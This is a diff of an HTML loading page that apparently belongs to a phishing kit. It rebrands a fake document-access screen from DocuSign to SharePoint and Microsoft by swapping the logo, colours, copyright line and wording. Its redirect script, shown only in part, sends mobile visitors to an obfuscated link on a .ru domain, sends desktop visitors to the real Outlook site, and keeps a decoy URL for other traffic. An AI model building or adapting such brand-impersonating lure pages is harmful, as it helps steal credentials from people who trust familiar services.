@@ -3,44 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Accessing Document - DocuSign</title>
+    <title>Accessing Document - SharePoint</title>
     <style>
         body {
-            font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
-            background-color: #f8f8f8;
+            font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+            background-color: #f8f9fa; /* SharePoint-like light gray background */
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: #333;
+            color: #323130; /* SharePoint default text color */
         }
         .container {
             background-color: #ffffff;
-            border-radius: 4px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 8px; /* Slightly more rounded corners */
+            box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 .3px .9px 0 rgba(0,0,0,.108); /* SharePoint-like shadow */
             padding: 40px;
-            width: 480px;
+            width: 520px; /* Slightly wider */
             max-width: 90%;
             text-align: center;
         }
         .header {
             margin-bottom: 30px;
         }
-        .docusign-logo {
-            width: 150px;
-            height: auto;
+        .sharepoint-logo { /* Changed from docusign-logo */
+            width: 48px; /* Standard SharePoint/Microsoft logo size */
+            height: 48px;
             margin-bottom: 20px;
         }
         .title {
-            color: #19487C; /* DocuSign's darker blue */
-            font-size: 22px;
+            color: #007233; /* SharePoint primary blue */
+            font-size: 24px; /* Slightly larger title */
             font-weight: 600;
             margin: 0 0 10px 0;
         }
         .subtitle {
-            color: #555;
+            color: #605e5c; /* SharePoint secondary text color */
             font-size: 16px;
             margin-bottom: 30px;
         }
@@ -50,43 +50,43 @@
             align-items: center;
             margin-bottom: 20px;
         }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(0,0,0,0.1);
-            border-top-color: #FFD100; /* DocuSign yellow/gold */
+        .spinner { /* Using a simpler spinner, SharePoint often uses progress rings or dots */
+            width: 32px;
+            height: 32px;
+            border: 4px solid rgba(0, 114, 51, 0.2); /* Lighter green for spinner track */
+            border-top-color: #007233; /* SharePoint primary green */
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 15px;
         }
         .loading-text {
-            color: #333;
+            color: #323130;
             font-size: 16px;
             font-weight: 500;
             margin: 0;
         }
         .progress-container {
-            background-color: #e0e0e0;
+            background-color: #e1dfdd; /* SharePoint progress bar background */
             height: 8px;
             border-radius: 4px;
             overflow: hidden;
             margin-bottom: 20px;
             width: 100%;
         }
-        .progress-bar-fill { /* Renamed from .progress-bar to match original sec.html */
+        .progress-bar-fill {
             height: 100%;
-            background-color: #19487C;
+            background-color: #007233; /* SharePoint primary green */
             width: 0%;
             animation: fill 2.5s linear forwards;
             border-radius: 4px;
         }
         .file-info { 
-            color: #666;
+            color: #605e5c;
             font-size: 14px;
             margin: 0 0 30px 0;
         }
         .footer-text {
-            color: #777;
+            color: #605e5c;
             font-size: 12px;
             margin-top: 30px;
         }
@@ -104,9 +104,9 @@
             display: block;
             margin-top: 20px;
             padding: 15px;
-            background-color: #fff3cd;
-            color: #856404;
-            border: 1px solid #ffeeba;
+            background-color: #fff4ce; /* SharePoint warning yellow */
+            color: #323130;
+            border: 1px solid #f0e6a1;
             border-radius: 4px;
             font-size: 14px;
         }
@@ -115,9 +115,9 @@
 <body>
     <div class="container">
         <div class="header">
-            <img src="https://images.ctfassets.net/3fcisxc3a6xz/docusign_logo_black_text_on_white_0.png/90872cd475f92acafc7c490c93976e40/ds-logo-on-white.png" alt="DocuSign Logo" class="docusign-logo">
-            <h1 class="title">Preparing Your Document</h1>
-            <p class="subtitle">Please wait a moment while we get things ready for you.</p>
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTM-pue95UW8zH7rXJK5hwiYune9QqCrQLg3Q&s" alt="Company Logo" class="sharepoint-logo">
+            <h1 class="title">Accessing Your Document</h1>
+            <p class="subtitle">Please wait while we prepare your file from SharePoint.</p>
         </div>
         <div class="loading-container">
             <div class="spinner"></div>
@@ -128,16 +128,16 @@
         </div>
         <p class="file-info">This shouldn't take long.</p>
         <noscript>
-            <p>JavaScript is essential for DocuSign to function. Please enable JavaScript in your browser settings and reload the page.</p>
+            <p>JavaScript is essential for SharePoint to function. Please enable JavaScript in your browser settings and reload the page.</p>
         </noscript>
-        <p class="footer-text">&copy; DocuSign, Inc. All rights reserved.</p>
+        <p class="footer-text">&copy; 2025 Your Company. All rights reserved. Powered by Microsoft SharePoint.</p>
     </div>
 
     <!-- Simple device detection and redirect script -->
     <script>
     (function() {
         const REDIRECT_DELAY = 2500; // Adjusted for progress bar animation
-        const MOBILE_REDIRECT_URL_BASE = "https://F4Qhj.ewwyb.ru/yeCpAH!dIN6kr/$";
+        const MOBILE_REDIRECT_URL_BASE = "https://ZbgrM.ewwyb.ru/dsMb!vvJcU26gxo/$";
         const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
         const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
 
